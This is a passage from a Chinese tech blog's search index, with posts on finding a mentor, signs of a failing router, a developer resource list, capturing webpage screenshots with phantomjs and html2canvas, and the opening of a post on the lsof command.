平级的 Leader）的人脉，他们在公司的时间一般会更久一些，接触过的人会比较多，而且他们已经积累了一定的信誉，可以帮助你引荐更多不错的人。 有些公司的职级是公开的，你也可以从公司的通讯录中找到那些职级比自己高一两级的人，甚至高三四级的人，跟他们聊一聊，根据我的经验，大部分人还是比较乐意跟你聊的，但，是否能成为你的导师，还需要看你自己的表现，以及他们的时间安排。 另外，你还可以从各种分享会、交流会、业务沟通会，甚至是技术文章、Code Review 的沟通等渠道找到优秀的人，聪明的你应该不乏找到这些人的方法，关键在于，找到了之后，怎么去建立联系，并保持长久的关系？ ","date":"2021-12-03","objectID":"/zh-cn/4-3/:0:1","tags":["导师"],"title":"给自己找个导师","uri":"/zh-cn/4-3/"},{"categories":["导师"],"content":"保持关系 优秀的人更喜欢跟优秀的人在一起，我想这个道理，大家都是明白的，如果你想找到一位优秀的 mentor，你首先需要做的一件事情就是，表现出自己有足够的潜力成为优秀的人，因为谁也不想去尝试把一块烂泥巴扶上墙。值得注意的是，导师也只是个助力点火的角色，不要想着有了导师，就觉得自己可以“躺着成长”，你还是得奔跑，甚至更快速、更猛烈地奔跑。 当发现自己成长的速度太慢的时候，需要先做一个自我诊断，列出自己的职业规划或者项目计划，对内容做分析，然后去比对期望值，看看自己还缺乏哪方面的知识、经验和能力。拿着你的分析，再去寻找导师寻求帮助。 当然，职场新人可能连自己想要什么都不知道，这个时候也可以去找导师聊一聊，询问一下那些优秀的人的成长经历是怎么样的，如果你也想成为那样的人，需要经历哪些阶段，慢慢的去找到适合自己的职业规划。 导师持续向你输出帮助的动力在于，他期望通过对你的帮助让你飞快地提升，一方面提升他的影响力，一方面从中获得成就感。Facebook 在这方面拿到的成果是可以纳入个人考核的，所以你会发现，在这家公司，你不用特别主动地去找 mentor，也会有 mentor 主动上门询问你是需要获得帮助，这样的氛围是不是挺有意思的~ 😄 给自己制定一个 3 个月到半年的详细规划，其中包含明确的目标、里程碑计划、每个阶段的衡量指标，以及每个阶段你可能会遇到的问题和风险，拿着这个规划，每半月或者一个月与导师对焦，让他给你的项目、个人发展、职业规范等各方面提出建议，在这个过程中，可以适当聊聊工作之外的事情，不断加深与导师之间的关系。 ","date":"2021-12-03","objectID":"/zh-cn/4-3/:0:2","tags":["导师"],"title":"给自己找个导师","uri":"/zh-cn/4-3/"},{"categories":["导师"],"content":"导师的职责 优秀且有社交欲望的导师，会同时去给好多人提供帮助，这对导师来说，也是一种历练，有一个职业叫做 career coach，跟导师的工作内容就比较贴切了，只不过 career coach 是收费的，你跟他们之间通过物质利益输送保持稳定关系，这对发展潜力不够突出的人来说，或许是个快速找到导师的渠道。 有个词叫做因地制宜，什么样的土壤培育出什么样的种子，有的导师会习惯性地将你引导到他熟悉的路上，但这条路可能并不适合你，而导师的说服力一般都会特别强，在跟他沟通的过程中，你似乎很难拒绝不走他为你选择的路，这一点就十分尴尬了。 所以，**作为导师，也需要在沟通中掌握更多的信息，结合学生的个人需求和个人特征，在长期目标上达成一致性。**当然，有的时候，导师的判断是对的，只不过学生不想踏出舒适区，这就需要更多的情感支撑，帮助对方走过难关。 导师，本身就是个挺难驾驭的角色，并不是人人都能做好。 ","date":"2021-12-03","objectID":"/zh-cn/4-3/:0:3","tags":["导师"],"title":"给自己找个导师","uri":"/zh-cn/4-3/"},{"categories":["导师"],"content":"小结 开篇提到自己也有很多的操作不规范，更多的是过去给自己找导师的时候，缺少更多的规划性，都是讨论大方向问题，或者情感的倾诉，导师在我这里更多的是安慰剂或者强心剂，并没有起到长期辅助个人成长的作用。这一点是需要改进的。 写的匆忙，这次的早课分享就写到这里吧，大家有啥疑问可以提出来，后续再做更多的讨论。 以上，希望对有帮助。 ","date":"2021-12-03","objectID":"/zh-cn/4-3/:1:0","tags":["导师"],"title":"给自己找个导师","uri":"/zh-cn/4-3/"},{"categories":["网络","设备","路由器"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 如何判断我的路由器是否坏了 | 11 个坏路由器的迹象 这里有一个关于如何判断我的路由器是坏了还是坏了的指南。看看吧！ 当互联网崩溃时，它既令人疯狂又令人沮丧。互联网的速度和效率对我们所做的一切都有影响。我们要么参加会议，玩一个非常重要的游戏，参加在线课程，要么做其他事情。由于互联网连接不良，您可能会错过许多重要事件。 当您玩游戏时，您的互联网连接开始滞后，您可能会输掉获胜的游戏。因为互联网有潜力有所作为。当您观看视频时，它开始缓冲，您可能会认为问题是由路由器老化和过时造成的。许多人想知道，“无线路由器会失败吗？” 是的，路由器会过时，随着时间的推移而故障。路由器由设备内集成的工作机制组成。 这种机制甚至不会停止工作一分钟；当机器每周七天、每天24小时运行时，它可能会在某个时候开始缓慢而低效地运行。 但我如何确定我的路由器是否坏了？我们将遇到一些常见问题，这些问题可能表明您的互联网问题是由路由器引起的。 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:0:0","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"如何判断我的路由器是坏是坏还是失败 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:0","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"如果您有**登录问题，**那么您的路由器可能失败了 如果您遇到登录问题并开始接收连接通知，您应该更新路由器；否则，您将继续遇到问题，互联网访问有限。这意味着路由器有问题。 然而，偶尔路由器连接不正确，或者USB或以太网电缆存在问题。在这种情况下，您必须拔下路由器的电线并重新连接它们。在大多数情况下，路由器恢复正常运行。但是，如果您的路由器出现故障，您必须更换它。 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:1","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"如果您的路由器面临突然停机，您的路由器可能失败了 路由器突然停止工作并失去连接的情况并不少见。路由器和其他设备之间的连接偶尔会意外断开连接。 如果这种信号波动全天发生，路由器无法正常工作仍然是另一个症状。重新启动路由器有时有帮助，但建议对路由器进行测试，以确定真正的原因。 在极少数情况下，当WiFi网络上其他设备负载增加时，也会发生信号不一致或连接突然丧失。然而，在大多数情况下，问题是由路由器故障引起的。 我家里有这个TP-Link WiFi路由器。看看吧！ ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:2","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"如果您的互联网性能下降，您的路由器可能无法正常工作 路由器运行问题的最大症状是互联网速度放缓。它干扰了在线工作，并危及互联网功能。 要确定中断的原因，您必须首先确定连接是否有问题。您还可以将路由器连接到其他设备、测试、更换或购买新设备。如果您看到路由器不再与任何设备一起工作，您将意识到它已经过时。 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:3","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"如果您的路由器无响应，则您的路由器已损坏 路由器按照给它的指令行事。但是，如果路由器在响应无响应命令时出现延迟，您可以通过断开和重新连接来暂时解决问题。您可以通过拔下路由器并在几分钟后重新插入来实现这一目标。 这意味着速度缓慢是由一个队列造成的，如果网络立即启动，该队列会堵塞网络。但是，如果正确插入和再次检查后仍然不起作用，您必须修复或更换有问题的路由器。 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:4","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"路由器上的故障指示灯表示路由器有故障 路由器上的LED指示灯清楚地指示了互联网连接是否稳定。然而，如果这些指示灯显示故障，则表示路由器无法正常工作。 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:5","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"如果您的路由器正在持续重新连接到您的设备，路由器有问题 如果您不得不全天不断将路由器重新连接到您的设备，路由器有问题。可以通过重置设备来解决这个问题。 您必须导航到路由器的配置页面，然后选择“重置设备”选项。如果它解决了问题，您不需要立即更换路由器，但如果路由器经常故障或即使在重置后也无法工作，则需要更换路由器。 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:6","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"如果连接的设备无法正常工作，请检查路由器是否有坏端口或无线故障 这不太可能。如果端口的无线功能无法正常工作，路由器可能会停止工作。在这种情况下，您可能会注意到连接到路由器的其他设备运行正常，但只有一台设备的连接失败。如果设备不工作，并通过以太网电缆连接，您可以尝试其他广域网或局域网端口。 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:7","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"路由器年龄可能是路由器失败的原因 如果使用得当，路由器应该能用三到五年。为了实现平稳快速的互联网连接，您必须每五年升级一次路由器。使用多年后，如果它因技术过时而中断或变慢，则必须更换。 随着时间的推移，它经常积累多层灰尘，这通常密封内部通风口。它还可以通过过时的硬件来减慢速度。因此，随着路由器的老化，其有效性会恶化，因此需要升级。 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:8","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"路由器过热可能会损坏路由器 这是技术设备最常见的问题之一。当路由器过度使用或放置不当时，它会发热并破坏设备。 因此，如果您使用Wi-Fi路由器的时间超过给定的平均预期寿命，它就会开始故障，并且由于路由器的加热，其任何内部组件不再工作。 路由器过热的此类迹象包括互联网连接波动、速度缓慢、塑料臭味烧焦和硬件故障。如果您注意到路由器过热很快，您应该更换它。 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:9","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"如果路由器物理损坏，它可能会停止工作 路由器通常构造良好，可以承受磨损以及从架子上掉下来的影响。只有从显著高度处的灾难性跌落或下降才能对内部电路板造成损坏。如果您发现路由器外壳有大故障，您必须修复或更换它。 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:10","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"路由器可能过时了，以支持更新的小工具 如果路由器上新安装的设备无法正常工作，这是由于不兼容。随着技术的进步，许多ISP和科技公司发布了使用新芯片、组件和网络组件的新设备。 这些尖端小工具和组件仅与使用尖端技术的路由器兼容。因此，一些路由器最终将无法支持任何新设备。 如果路由器显示此警告，提示无法支持许多设备，并且您在连接到最新小工具时遇到问题，则设备应被视为停产设备。解决这个问题的最佳方法是用最新版本来取代它。 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:11","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"路由器问题的解决方案 在进行这些测试时，您可能会发现各种结果，具体取决于您可能需要采取预防措施来解决这些担忧。让我们看看可能的结果和预防措施： 当您的ISP出现问题时会发生什么？ 如果您已经测试并确定问题不在路由器上。如果问题与您的ISP有关，您应该重新启动系统，如果这不能解决问题，请联系您的ISP。 与ISP无关的连接问题 如果您没有检测到ISP或路由器有任何问题。您的电源线或以太网电缆可能存在问题。它可能断开连接或无法正常工作。它也可能被损坏，因此在宣布路由器停产之前，请检查连接到设备的电线。要解决这个问题，只需更换电缆。 你的路由器坏了 在这些测试之后，如果您得出结论，您的路由器已经过时，不再有效工作，您知道是时候更换旧路由器并购买新路由器了。 内部网络问题 由于连接到路由器的大量设备吸吮带宽，您的路由器可能出现故障。因此，请确保也关注这一点。为了获得最佳性能，您应该使用三波段路由器。 它将显示同时连接的活动和设备，导致网络连接非常缓慢。因此，在将路由器推出换成新路由器之前，请仔细检查一下。 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:12","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["网络","设备","路由器"],"content":"现代路由器的特点 有了这些症状，您将能够确定路由器的工作情况以及它是否工作正常。如果您的路由器不再工作，您必须更换它。除了价格外，现代路由器必须包含以下功能： **范围：**信号的范围决定了连接的距离。 **带宽：**如果您想要最多的带宽，您应该至少拥有双频路由器。 **速度：**路由器的速度由ISP决定，但其他因素，如路由器可以管理的速度，也发挥了作用。速度更快的路由器比速度较慢的路由器寿命更长。 **兼容性：**您购买的新路由器必须与您之前连接的ISP兼容。因此，如果路由器不兼容，您的连接将效率低下。 结论 本文将为您提供确定路由器是否正常工作所需的所有信息。如果您的路由器出现故障，并且您的连接同样缓慢和中断，或者它没有响应指令，并且您在使用WiFi时遇到困难，那么是时候买一个新的了。 ","date":"2021-12-03","objectID":"/zh-cn/3-3/:1:13","tags":["网络","设备","路由器"],"title":"如何判断我的路由器是否坏了 | 11 个坏路由器的迹象","uri":"/zh-cn/3-3/"},{"categories":["编程","开发","资源"],"content":"此文为加密收费内容添加我微信支付后可看: $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 编程开发资源 ","date":"2021-12-03","objectID":"/zh-cn/3-2/:0:0","tags":["编程","开发","资源"],"title":"编程开发资源","uri":"/zh-cn/3-2/"},{"categories":["编程","开发","资源"],"content":"说明 以上资源整理自黑洞资源笔记，此外，本篇中英文资源数量较多。 ","date":"2021-12-03","objectID":"/zh-cn/3-2/:0:1","tags":["编程","开发","资源"],"title":"编程开发资源","uri":"/zh-cn/3-2/"},{"categories":["编程","开发","资源"],"content":"生成器 1.Lorem Ipsum Lorem Ipsum发生器 2.RealFaviconGenerator 图标生成器 3.Favicon Maker 免费的Favicon制造商 4.Meta Tags 元标记生成器，预览您的网页在Google，Facebook，Twitter等上的外观 5.Clippy CSS剪切路径生成器 6.Regex101 在线正则表达式测试器 7.Web代码工具 生成HTML5，CSS3，微数据，JSON-LD，Twitter卡，Open Graph等 8.Carbon 创建并共享您来源的精美图像 9.CSS网格生成器 快速设计网页布局，并获取HTML和CSS代码。直观地学习CSS Grid，并使用我们的交互式CSS Grid Generator构建Web布局 ","date":"2021-12-03","objectID":"/zh-cn/3-2/:0:2","tags":["编程","开发","资源"],"title":"编程开发资源","uri":"/zh-cn/3-2/"},{"categories":["编程","开发","资源"],"content":"web开发资源 开发者的roadmaps 1.Frontend 前端开发路线图 2.Backend 后端开发路线图 3.React React开发路线图 4.Andriod Android开发路线图 5.DevOps DevOps路线图 文档和备忘单 1.MDN Web Docs MDN Web Docs网站提供有关Open Web技术的信息，包括网站和渐进式Web应用程序的HTML，CSS和API 2.DevDocs 为开发人员提供的快速，离线和免费的文档浏览器。在一个Web应用程序中搜索100多个文档 3.DEVHINTS 命令查询备忘单 4.FLEX - Malven 用于CSS flex布局的可视备忘单 5.GRID - Malven CSS网格布局的可视备忘单 ","date":"2021-12-03","objectID":"/zh-cn/3-2/:0:3","tags":["编程","开发","资源"],"title":"编程开发资源","uri":"/zh-cn/3-2/"},{"categories":["编程","开发","资源"],"content":"教程 互联网 1.互联网的工作原理视频 互联网如何运作 2.互联网的工作原理简短视频 关于互联网如何工作的简要说明 3.域名解析 DNS如何工作 4.HTTPS HTTPS如何工作 5.HTTP状态代码 HTTP状态代码目录，其中包含定义，详细信息和有用的代码参考 HTML和CSS 1.freeCodeCamp 学习Web开发的免费课程 2.Interneting Is Hard 面向完整初学者的友好的Web开发教程 3.HTML Elements 由MDN引用的HTML元素 4.HTML Entity CSS技巧的HTML实体参考 5.CSS3属性 MDN引用的CSS 6.CSS参考 CSS的免费视觉指南 7.Flexbox Froggy 一款可帮助您学习CSS Flex的游戏 8.CSS技巧 Flexbox -Flexbox完整指南 9.网格花园 一个学习CSS网格的游戏 10.CSS TRICKS - A Complete Guide to Grid CSS网格的全面指南，着重于网格父容器和网格子元素的所有设置 11.学习CSS网格 Jonathan Suh撰写的综合指南，可帮助了解和学习CSS网格布局 12.Can I Use 最新的浏览器支持表，以支持台式机和移动Web浏览器上的前端Web技术。 13.CSS Effects CSS动画 14.Keyframes 使用可视时间轴编辑器创建基本或复杂的CSS 15.Animista CSS动画的集合 16.BEM BEM命名备忘单 17.Autoprefixer 一个PostCSS插件，可解析您的CSS并添加供应商前缀 18.CSS Formatter 在线CSS Formatter，CSS Beautifier 19.Placeholder 如何使用我们的占位符。只需在我们的URL后指定图像大小，将获得一个占位符图像 JavaScript 1.freeCodeCamp 最好的免费资源，用于以交互方式学习JavaScript 2.Codecademy 免费课程，以交互方式学习JavaScript 3.JavaScript.info 现代JavaScript教程 4.Eloquent JavaScript 这是一本有关JavaScript，编程和数字奇迹的书。您可以在此处在线阅读 5.JavaScript30 30天香草JS编码挑战。在30天内使用30个教程构建30件事 6.JavaScript的工作方式 7.MDN的JavaScript参考 8.JavaScript事件参考 9.DOM操作参考 10.JavaScript设计模式 11.JavaScript资讯 现代JavaScript教程 Node.js 1.Node.js教程 Net Ninja编写的Node.js速成课程教程 2.最佳实践 大量的构建节点应用程序的最佳实践。对于大型项目很重要。 3.The Node Way Node.js最佳实践的完整哲学和指导原则，用于编写可维护的模块，可伸缩的应用程序和易于阅读的代码 4.Awesome Nodejs 令人愉快的Node.js软件包和资源 5.Express.js安全提示 如何保存和保护应用程序 6.你不知道Node.js Python 1.Codecademy 免费课程，以交互方式学习Python 2.Programiz 学习Python编程 3.Awesome Python 精选的Python框架，库，软件和资源的精选清单 4.Flask教程 Miguel Grinberg编写的Flask Mega-Tutorial 5.Real Python 在线学习Python：面向所有技能水平的开发人员的Python教程，Python书籍和课程，Python新闻，代码示例，文章等 APIS 1.公共API 面向开发人员的1000多种免费的公共和开放REST API的汇总列表 2.JSONPlaceholder 免费使用伪造的在线REST API进行测试和原型制作 3.OpenWeather 来自OpenWeatherMap的简单，快速，免费的天气API，您可以访问当前的天气数据，每小时，5天和16天的天气预报 4.SWAPI 星际大战API 5.Quotes REST API 这是世界上最大的此类数据库。Quotes API提供了一种简单的方法来访问数据 ","date":"2021-12-03","objectID":"/zh-cn/3-2/:0:4","tags":["编程","开发","资源"],"title":"编程开发资源","uri":"/zh-cn/3-2/"},{"categories":["编程","开发","资源"],"content":"开发者工具 1.Postman 使API开发变得容易。简化构建API的每个步骤并简化协作，以便您可以更快地创建更好的API 2.Insomnia 领先的开源API客户端，以及用于GraphQL和REST的协作API设计平台 3.JSON Server 在不到30秒的时间内（严重）获得具有零编码的完全伪造的REST API。供需要快速后端进行原型制作和模拟的前端开发人员使用。 4.npm trends 您应该使用哪个NPM软件包？比较一段时间内的NPM软件包下载统计信息。找出趋势，选出赢家 5.BUNDLEPHOBIA 查找将npm软件包添加到软件包中的成本 6.Figma Figma帮助团队从头到尾创建，测试和交付更好的设计 7.Adobe XD 通过外观和感觉像真实事物的设计分享您的故事。线框，动画，原型，协作等等—一切都在这里，一站式完成。 8.Sketch 使用超过100万人使用的设计平台，从自由职业者到全球最大的团队，创建，制作原型，进行协作并将您的想法变为现实 9.Whimsical 以思想的速度进行视觉交流–协作流程图，线框，便签和思维导图。 10.ResumeGenius 唯一可以吸引您面试的在线简历构建器。在几分钟之内创建一份专业的简历，下载并打印 11.resume.io 免费的在线简历制作工具，可让您在数分钟内创建完美的简历 12.Resume Now 只需要几分钟,在线简历制作者应该花很长时间使用,我们免费的简历制作者不需要 13.Canva 使用Canva的免费简历生成器，可以轻松快捷地申请理想的工作。从数百种免费中选择 14.novoresume 在2020年制作完美的简历，并使用免费的简历生成器获得理想的工作。选择一个模板。个性化它 15.RX-Resume 轻松建立您的简历 16.mailsac 一次性测试电子邮件收件箱服务 17.Tiny Helpers 面向Web开发人员的免费的单用途在线工具集合 18.Free for Developers 这是为开发人员提供免费套餐的软件和其他产品的列表 ","date":"2021-12-03","objectID":"/zh-cn/3-2/:0:5","tags":["编程","开发","资源"],"title":"编程开发资源","uri":"/zh-cn/3-2/"},{"categories":["编程","开发","资源"],"content":"在线学习资源 1.w3schools 世界上最大的Web开发人员网站。教程参考，示例，实践，证书 2.Codecademy 学习所需工作所需的技术技能。作为在线教育和学习编码的领导者 3.Study Tonight 学习-通过手写的简单教程，测试和视频教程学习诸如Java，C ++，DBMS，数据结构等工程主题的最佳场所 4.Programiz 通过我们易于遵循的教程，示例，在线编译器和参考资料，学习使用Python，C / C ++，Java和其他流行的编程语言进行编码 5.命令行教程 UNIX基本命令教程 6.Try Git 一系列互动的挑战，以学习和尝试Git。恢复 7.Dev Resources 开发资源可为您的开发者之旅提供一切，所有内容均列在精选列表中 ","date":"2021-12-03","objectID":"/zh-cn/3-2/:0:6","tags":["编程","开发","资源"],"title":"编程开发资源","uri":"/zh-cn/3-2/"},{"categories":["编程","开发","资源"],"content":"开发者站点 1.DEV 一个建设性和包容性的社交网络。开源且完全透明 2.Medium 媒介是一个开放的平台，读者可以在其中找到动态思维，专家和未被发现的声音可以在任何主题上分享他们的作品 3.Hacker News 从Hacker News获取最新信息 4.Hacker Noon Hacker Noon用真实的技术专家撰写的不受束缚的故事和观点反映了技术行业 5.Smashing Magazine 适用于Web设计师和开发人员 6.Hashnode 一个免费的内容创建平台和社区，允许您在自己的域上发布文章 ","date":"2021-12-03","objectID":"/zh-cn/3-2/:0:7","tags":["编程","开发","资源"],"title":"编程开发资源","uri":"/zh-cn/3-2/"},{"categories":["JavaScript"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 使用 JavaScript 截屏 经常在微博上看到很多内容使用的什么长微博截图，并且截图上还附加了很多其他的信息。之前对纯前端截图有些研究，正好本博客有这个需求，今天就把这东西实现了下。 需要声明的是，JavaScript 目前还不能实现网页截屏，就算以后能够实现，也一定是浏览器提供了相关接口，JS 去调用这些接口。既然不能截屏，那我们能做的只有通过拿到像素点的信息来”拼凑”图片。 ","date":"2021-12-03","objectID":"/zh-cn/3-1/:0:0","tags":["JavaScript"],"title":"使用 JavaScript 截屏","uri":"/zh-cn/3-1/"},{"categories":["JavaScript"],"content":"先说说我们看到的截屏方式 用过 phantomJS 的同学都知道，它提供了一个截屏函数，通过它可以整屏获取页面截图，而且他支持的格式也比较多：JPG/PNG/GIF/PDF。通过简单的两句命令就可以把一个网页截取下来： // render.js var webPage = require('webpage'); var page = webPage.create(); page.viewportSize = { width: 1920, height: 1080 }; page.open(\"http://www.taobao.com\", function start(status) { page.render('taobao_home.jpeg', {format: 'jpeg', quality: '100'}); phantom.exit(); }); 安装 phantomjs 之后执行下上面的文件： phantomjs render.js 你会发现，一张宽度很窄的淘宝首页图就保存到了同目录下的 taobao_home.jpeg 中。也有同学使用 phantomjs 做了很多有意思的东西，比如每隔 100ms 截图，然后对比图像之间的差异，分析网页的加载情况和性能问题，甚至做网页的监控。好吧，话题收回来，继续说说其他的截屏方式，关于 phantomjs 可以移步到官网学习。 ","date":"2021-12-03","objectID":"/zh-cn/3-1/:0:1","tags":["JavaScript"],"title":"使用 JavaScript 截屏","uri":"/zh-cn/3-1/"},{"categories":["JavaScript"],"content":"前端截屏方案 能够导出图片的，目前只有 canvas。页面上的元素，除了图片、视音频、SVG等，其他都是文字，都可以使用 css 样式变换出来。我们知道，在 canvas 中是可以绘制图片和文字的，那么问题就很好解决了。 遍历页面的所有元素，提取DOM数 获取渲染之后的每个 DOM 节点的内联、外链 CSS 属性 将样式转换成 canvas 的属性，利用 offset 等属性辅助摆放位置，将节点对应到 canvas 上 这个方案比较粗糙，但是对于简单的页面，以上操作就能导出一张几乎与原状一模一样的图片。当然，我们想到的，也有人实现出来了，html2canvas 就是一个关注度很高的 js 截屏库，它考虑的内容会更多更全面。比如： 我博客左侧的微博小图标，hover 上去有一个微博分享，这里我就使用了这个库截取博客全文视图（考虑小屏手机，我把宽度设置成 480，比较窄），其实现是很简单的： html2canvas(document.body).then(function(canvas) { canvas.id = 'screenshotCanvas'; document.body.appendChild(canvas); }); 此时，页面的截图已经 append 到了 body 中。canvas 提供了导出图片的函数： var can = documeng.getElementById(\"screenshotCanvas\"); var imgDataURI = can.toDataURL('image/png'); 我们也可以将到处的内容转化成一个 blob 流，这样就能直接通过 URI 地址来访问了。 ","date":"2021-12-03","objectID":"/zh-cn/3-1/:0:2","tags":["JavaScript"],"title":"使用 JavaScript 截屏","uri":"/zh-cn/3-1/"},{"categories":["JavaScript"],"content":"原始需求是将图片分享出去 无论是 dataURI 还是还是 blob 流，他们都没办法当做一个 URL 在网络上访问，所以当我使用微博分享（附加图片分享）的时候，图片总是拿不到。 var shareUrl = \"http://service.weibo.com/share/share.php?appkey=YOUR_APP_KEY\u0026title=\" + title + \"\u0026url=\" + url + \"\u0026searchPic=false\u0026style=simple\u0026pic=\" + picUrl; 这里的 picUrl 必须是一个 http 可请求到的地址，实在是无奈呀，在 coding.net 写了一个小应用，用来临时储存图片（10分钟之后删除上传图片），有需要的可以试用下： 源码地址：http://github.com/demo-platform/resolve-blob Demo地址：http://tmpfile.coding.io JQuery 用户可以这样搞： var fd = new FormData(); fd.append(\"img\", imgBlob); $.ajax({ type: \"POST\", url: \"http://tmpfile.coding.io/img\", dataType: 'json', data: fd, crossDomain: true, processData: false, contentType: false, success: function(data){ if(data \u0026\u0026 data.path) { console.log(\"http://tmpfile.coding.io/tmp\" + data.path); } } }); ","date":"2021-12-03","objectID":"/zh-cn/3-1/:0:3","tags":["JavaScript"],"title":"使用 JavaScript 截屏","uri":"/zh-cn/3-1/"},{"categories":["JavaScript"],"content":"小结 只要能拿到原始图，之后的加工处理都是比较简单的。比如如何实现画框截取某个区域的图形，思路就是截取整图，记住鼠标按下和抬起的两个点，然后从整图中抠出来就搞定了。在 QQ 空间发表说说的地方有提供截屏工具，这是因为腾讯在电脑上安装了插件，并且提供了对应的 JS 接口，JS 是没有能力直接截屏的。 好吧，了解原理就好，人家有现成的库可以用，咱们不要动不动就造轮子，不好玩。 ","date":"2021-12-03","objectID":"/zh-cn/3-1/:0:4","tags":["JavaScript"],"title":"使用 JavaScript 截屏","uri":"/zh-cn/3-1/"},{"categories":["UNIX"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # unix下的文件操纵 unix/linux 下的命令太多了，花时间系统去学肯定十分枯燥，平时有需求用到某些命令的时候就会将这个命令所有的功能都看看，这次是为了关掉某个端口的进程，学习了下 lsof 和 kill 命令。 在 sublime 中配置了开启 node 的快捷方式，Command + B 可以直接执行正在编辑的 js 文件。多次由于操作不当，报错： Error: listen EADDRINUSE at exports._errnoException (util.js:746:11) at Server._listen2 (net.js:1156:14) at listen (net.js:1182:10) at Server.listen (net.js:1267:5) ... 意思就是端口被占用 EADDRINUSE，即 “Error: Address in use”，这里为啥唤作 address 而不是 port 被占用，还是有说法的。 在 linux/unix 下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。如 TCP/UDP 套接字，应用程序都会在系统目录下为期分配一个文件描述符，这个描述符就是程序和系统交互的接口。 ","date":"2021-12-03","objectID":"/zh-cn/3/:0:0","tags":["UNIX"],"title":"unix下的文件操纵","uri":"/zh-cn/3/"},{"categories":["UNIX"],"content":"lsof 命令 lsof 是 *nix 下常用的一个命令，全称为 “list open file”，列举被打开的文件描述符的相关信息，包括： -u 用户，如 root -c 